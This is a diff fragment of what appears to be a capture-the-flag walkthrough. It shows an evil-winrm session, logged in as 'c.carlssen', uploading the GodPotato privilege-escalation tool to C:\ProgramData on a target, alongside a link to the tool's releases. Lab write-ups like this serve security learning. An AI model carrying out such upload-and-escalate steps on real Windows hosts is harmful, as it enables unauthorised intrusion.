@@ -929,4 +929,13 @@ Ill get a copy of godpotato from github
 
 https://github.com/BeichenDream/GodPotato/releases
 
+```python
+evil-winrm-py PS C:\ProgramData> upload GodPotato-NET4.exe .
+Uploading /home/kali/htb/pingpong/GodPotato-NET4.exe: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 56.0k/56.0k [00:00<00:00, 62.7kB/s]
+[+] File uploaded successfully as: C:\ProgramData\GodPotato-NET4.exe
+evil-winrm-py PS C:\ProgramData>
+```
+
+Ill use my winrm session as `c.carlssen` to upload it to the target
+
 
